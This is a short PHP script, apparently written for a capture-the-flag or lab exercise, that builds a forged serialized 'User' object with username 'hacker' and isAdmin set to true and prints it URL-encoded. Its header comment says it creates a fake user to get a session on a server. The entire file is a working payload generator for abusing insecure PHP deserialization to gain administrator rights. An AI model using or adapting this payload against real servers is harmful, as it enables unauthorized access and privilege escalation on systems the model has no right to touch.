<!--
Script written by Carlos Chacón Molina

Script used to create a fake user to get a Session in the server.
-->

<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>